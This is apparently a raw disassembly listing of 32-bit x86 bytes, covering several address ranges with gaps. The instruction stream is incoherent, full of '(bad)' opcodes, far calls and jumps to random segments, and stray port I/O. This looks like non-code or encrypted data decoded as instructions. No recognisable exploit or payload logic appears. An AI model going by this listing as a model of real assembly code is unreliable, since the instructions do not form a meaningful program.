  428cc7:	xor    DWORD PTR [eax+0x15],edi
  428cca:	xchg   ecx,eax
  428ccb:	sub    edi,DWORD PTR [ebp+0x1e]
  428cce:	xchg   ebx,eax
  428ccf:	adc    eax,0x5de750de
  428cd4:	add    dl,bl
  428cd6:	mov    DWORD PTR [edx+0x69],ecx
  428cd9:	adc    dl,BYTE PTR [edi+0x598a73d]
  428cdf:	into   
  428ce0:	push   ss
  428ce1:	push   esi
  428ce2:	repz add BYTE PTR [edx],bh
  428ce5:	leave  
  428ce6:	jno    0x428cb1
  428ce8:	js     0x428cb8
  428cea:	xchg   ebp,eax
  428ceb:	repz mov ds:0xdb3a2363,eax
  428cf1:	sbb    DWORD PTR [ecx],eax
  428cf3:	test   DWORD PTR ds:0xa16de9bd,ecx
  428cf9:	sbb    DWORD PTR [ebx],ecx
  428cfb:	(bad)  
  428cfc:	cmp    al,0x6
  428cfe:	les    edi,FWORD PTR [ebp-0x4c]
  428d01:	mov    bh,0x84
  428d03:	push   esi
  428d04:	add    eax,0xc0259b19
  428d09:	shl    DWORD PTR [edx+0x66],1
  428d0c:	arpl   ax,ax
  428d0e:	push   ebp
  428d0f:	dec    ecx
	...
  428d74:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0x6a16
  428d82:	pop    edi
  428d83:	dec    ecx
  428d84:	pop    eax
  428d85:	mov    ah,0x1
  428d87:	add    BYTE PTR [ecx+eax*1],al
  428d8a:	add    BYTE PTR [eax],al
  428d8c:	mov    esp,0xe18a9929
  428d91:	push   0xc09cfab4
  428d96:	scas   al,BYTE PTR es:[edi]
  428d97:	loope  0x428e0f
  428d99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428d9a:	shr    DWORD PTR [edi],1
  428d9c:	dec    eax
  428d9d:	(bad)  
  428d9e:	shl    dh,1
  428da0:	push   ds
  428da1:	shl    ch,cl
  428da3:	in     al,0x17
  428da5:	mov    al,0x5
  428da7:	nop
  428da8:	cmp    BYTE PTR [ecx+edx*1+0x30f72093],0x9d
  428db0:	int    0xcf
  428db2:	jnp    0x428da4
  428db4:	pushf  
  428db5:	(bad)  
  428db7:	xor    ecx,DWORD PTR [ebp+ebx*4+0x2b]
  428dbb:	imul   eax,DWORD PTR [ebx+ebx*8],0xfffffff4
  428dbf:	pop    ebp
  428dc0:	cmp    ebp,ebx
  428dc2:	stc    
  428dc3:	xor    DWORD PTR [ebx-0x6e],0x924312a7
  428dca:	(bad)  
  428dcb:	leave  
  428dcc:	sbb    DWORD PTR [ebx+0x7ae1ae03],0xfe81d7f3
  428dd6:	lds    ebp,FWORD PTR [ebx+ebp*4+0x543ebcd3]
  428ddd:	sbb    eax,0x5ad0fa93
  428de2:	jae    0x428e26
  428de4:	sbb    eax,0xa7f21496
  428de9:	sbb    al,0x86
  428deb:	mov    dl,0x51
  428ded:	pop    edx
  428dee:	add    eax,0x29ef37f9
  428df3:	add    ch,BYTE PTR [edi]
  428df5:	out    0x3a,al
  428df7:	jae    0x428dc7
  428df9:	xchg   BYTE PTR [ebx-0x20],ah
  428dfc:	cdq    
  428dfd:	popa   
  428dfe:	adc    BYTE PTR [esi+0x11],dl
  428e01:	mov    ecx,?
  428e03:	mov    BYTE PTR [edi],cl
  428e05:	xchg   ebx,eax
  428e06:	aas    
  428e07:	fidivr WORD PTR [ecx-0x27]
  428e0a:	mov    edx,0x8a19e150
  428e0f:	stos   BYTE PTR es:[edi],al
  428e10:	in     eax,0x28
  428e12:	or     al,0x84
  428e14:	mov    ebx,0x8de0b65f
  428e19:	mov    DWORD PTR [edx+0x5804e5eb],eax
  428e1f:	jo     0x428df9
  428e21:	int3   
  428e22:	dec    esp
  428e23:	jl     0x428df5
  428e25:	inc    esp
  428e26:	sbb    bl,BYTE PTR [ecx+0x706f6ab5]
  428e2c:	ins    BYTE PTR es:[edi],dx
  428e2d:	jbe    0x428dc3
  428e2f:	daa    
  428e30:	sbb    bh,BYTE PTR [eax+edi*2]
  428e33:	(bad)  
  428e34:	(bad)  
  428e35:	dec    esp
  428e36:	mov    dl,0xf1
  428e38:	test   eax,0xe2278bc5
  428e3d:	lahf   
  428e3e:	into   
  428e3f:	pop    edx
  428e40:	jge    0x428e93
  428e42:	inc    edx
  428e43:	and    BYTE PTR [eax-0x424196b],bl
  428e49:	cld    
  428e4a:	xor    DWORD PTR [edi-0x31],ecx
  428e4d:	mov    ecx,0x7ead3599
  428e52:	addr16 in eax,0x18
  428e55:	bound  edi,QWORD PTR [esi-0x79]
  428e58:	or     esp,DWORD PTR [ecx]
  428e5a:	cdq    
  428e5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e5c:	inc    esp
  428e5d:	mov    bl,BYTE PTR [ebx+ecx*1]
  428e60:	adc    BYTE PTR [eax-0x12f416c7],dl
  428e66:	push   0x5a
  428e68:	xchg   ecx,eax
  428e69:	jmp    0x3340e586
  428e6e:	adc    BYTE PTR [eax+0x7b],bl
  428e71:	mov    eax,0x1aa7f303
  428e76:	ret    0x6033
  428e79:	mov    eax,ds:0x5c12c32f
  428e7e:	mov    al,0xfc
  428e80:	pop    edx
  428e81:	add    DWORD PTR [ebp+0x3c],0x783db3bd
  428e88:	retf   
  428e89:	mov    al,ds:0x7630c872
  428e8e:	popf   
	...
  428ef3:	add    BYTE PTR [edi+0x5d],cl
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x7d
  428f01:	(bad)  
  428f03:	fcomp  QWORD PTR [ebp+esi*4+0x1]
  428f07:	add    BYTE PTR [ecx+eax*1],al
  428f0a:	add    BYTE PTR [eax],al
  428f0c:	retf   
  428f0d:	jg     0x428f4d
  428f0f:	xchg   ebx,eax
  428f10:	mov    edx,es
  428f12:	fiadd  DWORD PTR [ebx-0x5b]
  428f15:	lds    edx,FWORD PTR [ebp+0x350b4f2]
  428f1b:	fnstcw WORD PTR [eax]
  428f1d:	dec    ecx
  428f1e:	mov    esi,0x3955c770
  428f23:	pushf  
  428f24:	adc    esi,DWORD PTR [eax]
  428f26:	scas   al,BYTE PTR es:[edi]
  428f27:	(bad)  
  428f28:	sti    
  428f29:	rcr    DWORD PTR [edi-0x5862f591],cl
  428f2f:	mov    bl,0xec
  428f31:	je     0x428f76
  428f33:	pusha  
  428f34:	es sub al,cl
  428f37:	ds pop esi
  428f39:	add    al,0x7
  428f3b:	pop    ss
  428f3c:	inc    edx
  428f3d:	stos   DWORD PTR es:[edi],eax
  428f3e:	xlat   BYTE PTR ds:[ebx]
  428f3f:	leave  
  428f40:	xor    esp,ebp
  428f42:	sub    al,0xe8
  428f44:	ins    DWORD PTR es:[edi],dx
  428f45:	stos   DWORD PTR es:[edi],eax
  428f46:	jl     0x428ee5
  428f48:	in     al,dx
  428f49:	clc    
  428f4a:	mov    al,0xa6
  428f4c:	rcl    DWORD PTR [ebx],cl
  428f4e:	and    al,0xf1
  428f50:	in     al,0x98
  428f52:	test   DWORD PTR [ebp+0x5c436e75],ecx
  428f58:	stos   BYTE PTR es:[edi],al
  428f59:	fcmovnu st,st(1)
  428f5b:	retf   
  428f5c:	jl     0x428f0a
  428f5e:	adc    ebx,DWORD PTR [esi+0x4a]
  428f61:	mov    BYTE PTR ds:0x25e192ab,ah
  428f67:	neg    BYTE PTR [ecx-0x64]
  428f6a:	mov    ch,0x2b
  428f6c:	xchg   DWORD PTR [ecx+0x7d],eax
  428f6f:	fnstsw WORD PTR [eax]
  428f71:	icebp  
  428f72:	mov    eax,ds:0x91cbd738
  428f77:	xor    DWORD PTR [ebx-0x1ff2364d],0x9251fd67
  428f81:	stos   DWORD PTR es:[edi],eax
  428f82:	idiv   edi
  428f84:	pop    edi
  428f85:	test   BYTE PTR [edx-0x8],dh
  428f88:	mov    cl,0xbc
  428f8a:	adc    eax,edx
  428f8c:	mov    ah,0xbb
  428f8e:	out    dx,eax
  428f8f:	push   eax
  428f90:	mov    eax,0x3eac75cf
  428f95:	loope  0x428fa4
  428f97:	and    eax,DWORD PTR [ebx+0x154f9134]
  428f9d:	push   ss
  428f9e:	or     eax,0x18119eac
  428fa3:	sahf   
  428fa4:	sahf   
  428fa5:	xchg   edx,eax
  428fa6:	addr16 mov ds:0xf347,al
  428faa:	pop    eax
  428fab:	cmp    DWORD PTR [ecx],eax
  428fad:	inc    esi
  428fae:	cmp    al,0x39
  428fb0:	push   0x6626714d
  428fb5:	(bad)  
  428fb6:	xchg   esi,eax
  428fb7:	jp     0x428f55
  428fb9:	(bad)  
  428fba:	or     ebp,eax
  428fbc:	nop
  428fbd:	and    bh,BYTE PTR [edx]
  428fbf:	fadd   DWORD PTR [ebp+eiz*4-0x27]
  428fc3:	(bad)  
  428fc4:	xlat   BYTE PTR ds:[ebx]
  428fc5:	sti    
  428fc6:	test   cl,ah
  428fc8:	dec    ebx
  428fc9:	jle    0x428f57
  428fcb:	cmp    BYTE PTR [ecx+0x76],dh
  428fce:	lds    edi,FWORD PTR [esi]
  428fd0:	dec    edx
  428fd1:	jl     0x429049
  428fd3:	jb     0x428fca
  428fd5:	out    dx,al
  428fd6:	std    
  428fd7:	push   eax
  428fd8:	jno    0x428fe2
  428fda:	pop    esp
  428fdb:	xor    al,0xb
  428fdd:	retf   
  428fde:	arpl   WORD PTR [esi+eiz*4-0x5d],bx
  428fe2:	pop    edi
  428fe3:	mov    ch,0xd
  428fe5:	test   BYTE PTR [eax+0x701174f8],0x54
  428fec:	(bad)  
  428fed:	clc    
  428fee:	jo     0x428fc4
  428ff0:	pusha  
  428ff1:	xchg   ebx,eax
  428ff2:	fld    DWORD PTR [esi]
  428ff4:	add    eax,0xe2699840
  428ff9:	mov    esi,0x7f03ffe8
  428ffe:	aas    
  428fff:	sub    al,0xa2
  429001:	rol    esp,1
  429003:	cmp    BYTE PTR [ebx],bh
  429005:	and    BYTE PTR [eax-0x4c],cl
  429008:	imul   esp,DWORD PTR [edx],0xdbba0bc7
  42900e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42900f:	retf   0x0
	...
  429072:	add    BYTE PTR [eax],al
  429074:	loope  0x429062
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0xccfc7b77
  429081:	(bad)  
  429082:	imul   esp,DWORD PTR [eax+0x1b660],0x104
  42908c:	xchg   esp,eax
  42908d:	dec    eax
  42908e:	mov    dh,0x45
  429090:	popa   
  429091:	mov    ds:0xc65a1fdc,al
  429096:	std    
  429097:	or     DWORD PTR [ebp+0x41],ebx
  42909a:	push   DWORD PTR [ebx+0x78]
  42909d:	jbe    0x429090
  42909f:	test   BYTE PTR [ebx+0x18],0xa8
  4290a3:	add    al,0x4c
  4290a5:	test   DWORD PTR [edx+esi*2+0x33],edi
  4290a9:	mov    edx,0x4c4e29af
  4290ae:	fs js  0x429124
  4290b1:	repnz and bl,BYTE PTR [edx]
  4290b4:	aas    
  4290b5:	xchg   BYTE PTR [ebx+esi*4+0x677603a1],ah
  4290bc:	in     eax,0x95
  4290be:	push   ebx
  4290bf:	and    BYTE PTR [ebp-0x16],al
  4290c2:	dec    edx
  4290c3:	(bad)  
  4290c4:	sub    eax,0x8bd9e944
  4290c9:	jge    0x42907a
  4290cb:	dec    ebp
  4290cc:	pop    edi
  4290cd:	ds loopne 0x429067
  4290d0:	es es not ah
  4290d4:	rcl    esi,cl
  4290d6:	mov    al,ds:0xd44f36ff
  4290db:	pop    edi
  4290dc:	inc    edx
  4290dd:	xlat   BYTE PTR gs:[ebx]
  4290df:	rcl    BYTE PTR [edi],cl
  4290e1:	(bad)  
  4290e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290e3:	hlt    
  4290e4:	int    0xc7
  4290e6:	repnz pop ds
  4290e8:	pushf  
  4290e9:	repz int3 
  4290eb:	dec    ecx
  4290ec:	jle    0x4290e1
  4290ee:	sub    eax,0x6c67176f
  4290f3:	mov    ch,0x88
  4290f5:	lea    ebp,[edi-0x9b07a55]
  4290fb:	mov    ds:0x5b9bf928,al
  429100:	mov    WORD PTR [ecx],gs
  429102:	bnd jns 0x429110
  429105:	(bad)  
  429107:	je     0x4290c4
  429109:	aam    0xf1
  42910b:	adc    BYTE PTR [ebp+ebx*2-0x63624771],bh
  429112:	sbb    ebp,ecx
  429114:	push   edi
  429115:	dec    esi
  429116:	scas   al,BYTE PTR es:[edi]
  429117:	stc    
  429118:	(bad)  
  429119:	mov    edi,0xcbef550f
  42911e:	es sbb bh,ah
  429121:	add    DWORD PTR [edx+0x58],ebx
  429124:	push   ecx
  429125:	lods   eax,DWORD PTR ds:[esi]
  429126:	xchg   esi,eax
  429127:	outs   dx,DWORD PTR ds:[esi]
  429128:	stc    
  429129:	dec    esi
  42912a:	adc    al,0x57
  42912c:	sbb    ebp,DWORD PTR [ecx-0x7b]
  42912f:	mov    edi,0x5918f373
  429134:	imul   edi,DWORD PTR [eax+0x59],0x1e
  429138:	fdivr  st(1),st
  42913a:	or     BYTE PTR [edi-0x6525214e],cl
  429140:	and    dh,cl
  429142:	jg     0x429133
  429144:	sahf   
  429145:	inc    edx
  429146:	bound  ebx,QWORD PTR [esi]
  429148:	mov    esp,0x6396b01e
  42914d:	out    dx,al
  42914e:	jle    0x429163
  429150:	xchg   edi,eax
  429151:	pop    esp
  429152:	ror    BYTE PTR [edx-0x41ed69d5],0x4f
  429159:	add    BYTE PTR [edx-0x21],ah
  42915c:	or     eax,eax
  42915e:	call   0x1aba:0x3aa82471
  429165:	aaa    
  429166:	inc    edi
  429167:	xor    eax,0x95a2a00e
  42916c:	sub    eax,0x7a796195
  429171:	adc    al,0xdc
  429173:	ficom  WORD PTR [ecx+0x3e]
  429176:	xchg   DWORD PTR [ebx+edx*4-0x6e435136],edi
  42917d:	test   al,0xac
  42917f:	aas    
  429180:	ret    
  429181:	ja     0x42912a
  429183:	cli    
  429184:	or     eax,0x8b46c5f4
  429189:	inc    esi
  42918a:	push   edi
  42918b:	ret    0x7b0
  42918e:	mov    edx,0xb3
	...
  4291f3:	add    BYTE PTR [esi-0x79],dl
  4291f6:	std    
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [ebp+eiz*2+0x6439fd43],0x40001b7
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [esi],dh
  42920d:	xor    esp,DWORD PTR [edx+eax*8-0x5d0ae7ca]
  429214:	cmp    esp,edi
  429216:	cmp    DWORD PTR [esi+0x7a235ef3],ebx
  42921c:	inc    ebp
  42921d:	inc    ecx
  42921e:	es jmp 0x74381fba
  429224:	aad    0xdf
  429226:	mov    dh,0xf
  429228:	pusha  
  429229:	inc    edi
  42922a:	xchg   ecx,eax
  42922b:	mov    ah,0x18
  42922d:	outs   dx,BYTE PTR ds:[esi]
  42922e:	sub    dh,BYTE PTR [edx+0x6f1a5e81]
  429234:	in     eax,0xe9
  429236:	imul   edx,DWORD PTR [esi+ebx*2+0x45],0xffffffc2
  42923b:	dec    ebx
  42923c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42923d:	adc    esi,DWORD PTR [esi]
  42923f:	adc    al,0xa5
  429241:	das    
  429242:	pop    ecx
  429243:	pop    ds
  429244:	push   ebx
  429245:	dec    esi
  429246:	ret    0xcaf0
  429249:	xlat   BYTE PTR ds:[ebx]
  42924a:	(bad)  
  42924d:	fucompp 
  42924f:	mov    edx,0xd026cfad
  429254:	dec    ebp
  429255:	cmp    bh,BYTE PTR [esi]
  429257:	mov    ebp,0xecebdef3
  42925c:	(bad)  
  42925d:	cmp    dl,BYTE PTR [esi]
  42925f:	jle    0x429213
  429261:	mov    dl,BYTE PTR [edx-0x27]
  429264:	add    esp,DWORD PTR [ebp-0x19]
  429267:	int    0x1d
  429269:	scas   eax,DWORD PTR es:[edi]
  42926a:	dec    edi
  42926b:	in     eax,dx
  42926c:	jbe    0x429226
  42926e:	in     al,dx
  42926f:	sahf   
  429270:	(bad)  
  429271:	enter  0xf84e,0xae
  429275:	sub    eax,ebp
  429277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429278:	jnp    0x42926a
  42927a:	std    
  42927b:	pop    ss
  42927c:	add    BYTE PTR [edx],dl
  42927e:	out    0x39,eax
  429280:	sbb    bl,BYTE PTR [ebx+0x10]
  429283:	sbb    cl,BYTE PTR [eax-0x1f]
  429286:	scas   al,BYTE PTR es:[edi]
  429287:	push   cs
  429288:	add    BYTE PTR [esi+0x71],0x72
  42928c:	mov    bl,0x4d
  42928e:	xlat   BYTE PTR ds:[ebx]
  42928f:	lds    eax,FWORD PTR [esi]
  429291:	pop    ds
  429292:	ss std 
  429294:	arpl   WORD PTR [ecx],bp
  429296:	sar    DWORD PTR ds:0xb61dbe60,cl
  42929c:	jmp    0x4292e5
  42929e:	push   ebp
  42929f:	(bad)  
  4292a1:	sbb    eax,DWORD PTR [ebx]
  4292a3:	mov    eax,0x2a2fc55b
  4292a8:	and    eax,0x225f0435
  4292ad:	popf   
  4292ae:	inc    eax
  4292af:	jno    0x42924b
  4292b1:	fisttp QWORD PTR [edx-0x3a]
  4292b4:	loope  0x42930f
  4292b6:	in     al,dx
  4292b7:	mov    ebp,0x9cbb00c7
  4292bc:	mov    esp,0x7863a463
  4292c1:	mov    ch,0xaa
  4292c3:	mov    esi,0x3b410aa5
  4292c8:	pop    eax
  4292c9:	pop    edx
  4292ca:	in     al,dx
  4292cb:	aaa    
  4292cc:	aam    0xf3
  4292ce:	dec    esp
  4292cf:	inc    ecx
  4292d0:	mov    edx,0xb3500dd4
  4292d5:	out    dx,al
  4292d6:	pop    esi
  4292d7:	or     edi,DWORD PTR [ebx+0x76eed516]
  4292dd:	adc    dl,cl
  4292df:	lock lea ebx,[eax-0x18]
  4292e3:	clc    
  4292e4:	fcom   DWORD PTR [ebx+0x3fcd147]
  4292ea:	add    al,0x6b
  4292ec:	dec    ebx
  4292ed:	and    ecx,DWORD PTR [edx+0x68eae8ab]
  4292f3:	cmp    DWORD PTR [edi+esi*8-0x26],eax
  4292f7:	mov    ds:0x68049af9,eax
  4292fc:	lock in eax,dx
  4292fe:	dec    edi
  4292ff:	fild   QWORD PTR [ecx-0x12]
  429302:	or     dh,BYTE PTR [ebx-0x1d]
  429305:	and    ebx,DWORD PTR [ebx+0x52]
  429308:	xor    eax,0x40d3927b
  42930d:	mov    ecx,0x6198
	...
  429372:	add    BYTE PTR [eax],al
  429374:	lock adc al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0x94
  429381:	sub    ah,BYTE PTR ds:0x1b8680a
  429387:	add    BYTE PTR [ecx+eax*1],al
  42938a:	add    BYTE PTR [eax],al
  42938c:	xor    esi,ecx
  42938e:	aam    0xf8
  429390:	int    0xfd
  429392:	jae    0x429363
  429394:	jae    0x4293d9
  429396:	pusha  
  429397:	and    dh,BYTE PTR [edx+0x5aaccd42]
  42939d:	cmc    
  42939e:	mov    ecx,0x8cdf565a
  4293a3:	add    cl,BYTE PTR [ebx+0x3aa1effa]
  4293a9:	nop
  4293aa:	cmp    eax,0xd27a683c
  4293af:	inc    DWORD PTR [esi-0x6e147cf3]
  4293b5:	or     DWORD PTR [esi+esi*1-0x7307a976],eax
  4293bc:	pop    ecx
  4293bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4293be:	(bad)  
  4293bf:	out    dx,al
  4293c0:	pop    eax
  4293c1:	inc    ecx
  4293c2:	adc    eax,0xa18d039a
  4293c7:	inc    esi
  4293c8:	mov    esp,0x3ae96483
  4293cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4293ce:	adc    ecx,DWORD PTR [edi+0x3d]
  4293d1:	xchg   cl,dh
  4293d3:	inc    edx
  4293d4:	in     al,0x78
  4293d6:	xor    BYTE PTR [esi+0x3513afa0],ch
  4293dc:	dec    ebp
  4293dd:	mov    edx,0x35aeb62e
  4293e2:	mov    WORD PTR [eax+0xa2005c7],ds
  4293e8:	dec    eax
  4293e9:	in     eax,dx
  4293ea:	push   ebp
  4293eb:	sub    eax,0x1ec5b2ba
  4293f0:	or     BYTE PTR [ebx],cl
  4293f2:	mov    ch,0xbc
  4293f4:	push   es
  4293f5:	pop    ebx
  4293f6:	cmpps  xmm1,XMMWORD PTR [edx-0x32a053fa],0x7f
  4293fe:	push   ecx
  4293ff:	mov    bh,0xd5
  429401:	test   DWORD PTR [ebp+ebx*4+0x4d],edi
  429405:	jno    0x429482
  429407:	sti    
  429408:	inc    ebp
  429409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42940a:	push   edi
  42940b:	mov    al,ds:0x10753b46
  429410:	lds    ecx,FWORD PTR [eax+0x2644917]
  429416:	cs or  esi,ecx
  429419:	ficomp DWORD PTR [ebp-0x11]
  42941c:	cmp    ah,ch
  42941e:	jmp    0x4024:0x8325ca8d
  429425:	xchg   esp,eax
  429426:	push   edi
  429427:	xor    ecx,DWORD PTR [ecx]
  429429:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42942a:	sbb    esp,ebx
  42942c:	sub    ebp,eax
  42942e:	jg     0x429435
  429430:	adc    DWORD PTR [ebx+edi*4],ebx
  429433:	shl    DWORD PTR [ebp-0x7b],0x66
  429437:	mov    al,0xfd
  429439:	jg     0x4293d7
  42943b:	mov    ebx,0x226da952
  429440:	out    0xab,eax
  429442:	ds stos DWORD PTR es:[edi],eax
  429444:	xchg   esp,eax
  429445:	rcl    BYTE PTR [ebx-0x12],cl
  429448:	sbb    DWORD PTR [edx+0x76],esi
  42944b:	not    DWORD PTR [ebx-0x6956c40f]
  429451:	ror    BYTE PTR [ecx],1
  429453:	xchg   edi,eax
  429454:	aaa    
  429455:	repnz lods al,BYTE PTR ds:[esi]
  429457:	mov    BYTE PTR [edi],ah
  429459:	cmp    DWORD PTR [ebx-0x29],eax
  42945c:	xor    al,0xc5
  42945e:	pop    ebp
  42945f:	in     al,dx
  429460:	in     eax,dx
  429461:	ror    edi,cl
  429463:	jne    0x429482
  429465:	pop    ebp
  429466:	jae    0x4293f9
  429468:	add    bh,BYTE PTR [ecx+eiz*1+0x54c42b52]
  42946f:	cmp    BYTE PTR [ecx],al
  429471:	sahf   
  429472:	cli    
  429473:	call   0x78bc0c2d
  429478:	push   DWORD PTR [eax-0x21c80296]
  42947e:	inc    edi
  42947f:	mov    ch,0x4e
  429481:	xchg   dh,dh
  429483:	sbb    BYTE PTR [edi-0x80],0x72
  429487:	aad    0xde
  429489:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42948a:	jno    0x429451
  42948c:	mov    ch,BYTE PTR [edx+edx*1]
  42948f:	inc    esi
	...
  4294f4:	dec    esp
  4294f5:	or     eax,0x3e532c13
  4294fa:	jg     0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp+0x6906b9ea],dx
  429503:	adc    ebp,DWORD PTR [ecx+edi*4+0x1]
  429507:	add    BYTE PTR [ecx+eax*1],al
  42950a:	add    BYTE PTR [eax],al
  42950c:	out    dx,eax
  42950d:	cdq    
  42950e:	push   es
  42950f:	pop    eax
  429510:	outs   dx,BYTE PTR ds:[esi]
  429511:	sub    BYTE PTR [eax+0x20e1202b],ch
  429517:	pop    edi
  429518:	cs sbb eax,0x80e2fe69
  42951e:	and    al,0xae
  429520:	ret    
  429521:	in     eax,0xe2
  429523:	sub    eax,0x7373317c
  429528:	ins    DWORD PTR es:[edi],dx
  429529:	ret    0xefc3
  42952c:	push   ebx
  42952d:	xor    ch,bh
  42952f:	mov    edi,0xd9fbc267
  429534:	xor    DWORD PTR [edi+0x2a5c854c],0x794cd8c7
  42953e:	push   edi
  42953f:	imul   eax,DWORD PTR [ebx],0x355d0d93
  429545:	mov    edi,edx
  429547:	lds    ebp,FWORD PTR [eax]
  429549:	jno    0x429525
  42954b:	push   0x46
  42954d:	icebp  
  42954e:	xor    eax,0x1954749d
  429553:	test   DWORD PTR [esi-0x4],edx
  429556:	ss jle 0x42953c
  429559:	cmp    bl,BYTE PTR [ebp+0x77cee5e5]
  42955f:	push   0x2
  429561:	pop    ds
  429562:	or     edi,DWORD PTR [edx]
  429564:	dec    edx
  429565:	clc    
  429566:	ficom  DWORD PTR [edi+0x3fa92b7f]
  42956c:	lods   eax,DWORD PTR ds:[esi]
  42956d:	std    
  42956e:	aaa    
  42956f:	xchg   ecx,eax
  429570:	pop    ss
  429571:	das    
  429572:	in     al,0x57
  429574:	scas   al,BYTE PTR es:[edi]
  429575:	sbb    al,0x73
  429577:	and    dl,0x8d
  42957a:	sub    BYTE PTR [edx],cl
  42957c:	sti    
  42957d:	rcr    DWORD PTR [edi],1
  42957f:	pop    es
  429580:	pop    eax
  429581:	or     cl,dh
  429583:	loope  0x4295a5
  429585:	mov    ebp,0x513af832
  42958a:	popa   
  42958b:	jne    0x4295b5
  42958d:	and    eax,0xae2d597a
  429592:	sbb    DWORD PTR [ecx],0x739916b3
  429598:	ds xor eax,0xd27ab7f2
  42959e:	dec    edx
  42959f:	or     al,al
  4295a1:	ror    esi,1
  4295a3:	out    0xf3,eax
  4295a5:	mov    ah,BYTE PTR [eax-0x61]
  4295a8:	push   esp
  4295a9:	popf   
  4295aa:	sub    al,0xb2
  4295ac:	xchg   ebx,eax
  4295ad:	loopne 0x4295f5
  4295af:	mov    dh,BYTE PTR [edi+0x52402d36]
  4295b5:	cld    
  4295b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4295b7:	mov    bl,0x88
  4295b9:	(bad)  
  4295ba:	jo     0x42956c
  4295bc:	pop    ecx
  4295bd:	sub    al,0x44
  4295bf:	mov    cl,0x58
  4295c1:	add    DWORD PTR [ebx+0x3d],edx
  4295c4:	push   edx
  4295c5:	jecxz  0x429603
  4295c7:	scas   eax,DWORD PTR es:[edi]
  4295c8:	fstp   TBYTE PTR [edx]
  4295ca:	aas    
  4295cb:	test   al,0x18
  4295cd:	mov    ds:0x8ca38318,al
  4295d2:	call   0xbaf1:0x1d48791c
  4295d9:	inc    edi
  4295da:	lahf   
  4295db:	into   
  4295dc:	mov    dh,0xbc
  4295de:	into   
  4295df:	xchg   ebp,eax
  4295e0:	jp     0x4295f5
  4295e2:	(bad)  
  4295e3:	mov    ds:0xd4c810a1,al
  4295e8:	or     BYTE PTR [ebp+0x4c19b021],bl
  4295ee:	mov    ebx,0xaeb230d0
  4295f3:	(bad)
  4295f6:	div    DWORD PTR [ebx]
  4295f8:	loopne 0x4295c5
  4295fa:	sbb    DWORD PTR [esi-0x330e9f5b],ebx
  429600:	ficom  WORD PTR [eax-0x6b]
  429603:	js     0x4295bd
  429605:	sbb    eax,0x96bc1f1d
  42960a:	jne    0x4295a8
  42960c:	dec    ebp
  42960d:	pop    edi
  42960e:	jb     0x4295e0
	...
  429674:	ins    DWORD PTR es:[edi],dx
  429675:	sbb    eax,0xfbf6c0e6
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	bound  ebx,QWORD PTR ds:0xba70fc1d
  429686:	add    DWORD PTR [eax],eax
  429688:	add    al,0x1
  42968a:	add    BYTE PTR [eax],al
  42968c:	aas    
  42968d:	ins    BYTE PTR es:[edi],dx
  42968e:	dec    edx
  42968f:	mov    ecx,0x875bc3f0
  429694:	iret   
  429695:	aaa    
  429696:	popa   
  429697:	je     0x4296ed
  429699:	push   edx
  42969a:	mov    ebx,eax
  42969c:	outs   dx,DWORD PTR ds:[esi]
  42969d:	mov    dh,0x87
  42969f:	test   DWORD PTR [eax-0x56],0xc50145e8
  4296a6:	mov    ds:0x7d41c575,eax
  4296ab:	and    BYTE PTR [edi+0x1e614a8f],dl
  4296b1:	mov    edi,0x63b7924d
  4296b6:	pop    esi
  4296b7:	inc    edi
  4296b8:	in     al,dx
  4296b9:	shl    DWORD PTR [edx+0x69],0xec
  4296bd:	lods   al,BYTE PTR ds:[esi]
  4296be:	fstp   QWORD PTR [edx+0x33]
  4296c1:	and    BYTE PTR [edx+0x29],bl
  4296c4:	xor    BYTE PTR [eax+0x38],ch
  4296c7:	push   ecx
  4296c8:	fcomp  QWORD PTR [edx-0x5655edf0]
  4296ce:	dec    esi
  4296cf:	pop    edi
  4296d0:	push   esp
  4296d1:	pop    eax
  4296d2:	addr16 mov bl,0x73
  4296d5:	enter  0x3dc9,0x0
  4296d9:	cmc    
  4296da:	imul   esp,DWORD PTR ds:0x4c34b36,0xffffff9a
  4296e1:	or     esi,esp
  4296e3:	js     0x429753
  4296e5:	and    eax,0x2c245fbc
  4296ea:	fsub   st,st(0)
  4296ec:	inc    esp
  4296ed:	rcl    BYTE PTR [esi-0x5b79039a],cl
  4296f3:	push   cs
  4296f4:	shl    DWORD PTR [eax+0x11],cl
  4296f7:	cld    
  4296f8:	scas   al,BYTE PTR es:[edi]
  4296f9:	mov    DWORD PTR [ebx],ebx
  4296fb:	call   0x7bac:0xbe8ca888
  429702:	sbb    BYTE PTR [eax-0x65784547],0x0
  429709:	rcl    edi,1
  42970b:	test   BYTE PTR [edi-0x6711aacb],0x4d
  429712:	push   ss
  429713:	loope  0x429699
  429715:	sbb    dh,BYTE PTR [edx]
  429717:	adc    eax,0xfa86948d
  42971c:	jp     0x429715
  42971e:	cmp    BYTE PTR [ebx],0x41
  429721:	mov    esp,0xe98cce0e
  429726:	jae    0x42970e
